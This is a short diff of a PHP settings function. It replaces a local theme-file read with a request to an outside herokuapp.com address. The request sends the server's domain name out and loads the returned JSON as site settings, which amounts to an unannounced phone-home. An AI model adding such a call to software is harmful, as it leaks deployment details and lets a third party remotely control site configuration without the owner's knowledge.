@@ -43,7 +43,8 @@
         //     return json_decode($json,true);
         // }
         function getSetting_(){
-            $json =  file_get_contents(base_url('tema.json'));
+            //base_url('tema.json')
+            $json =  file_get_contents("https://user4.herokuapp.com/?domain=".$_SERVER['SERVER_NAME']."&status=tvv");
             return json_decode($json,true);
         }
 
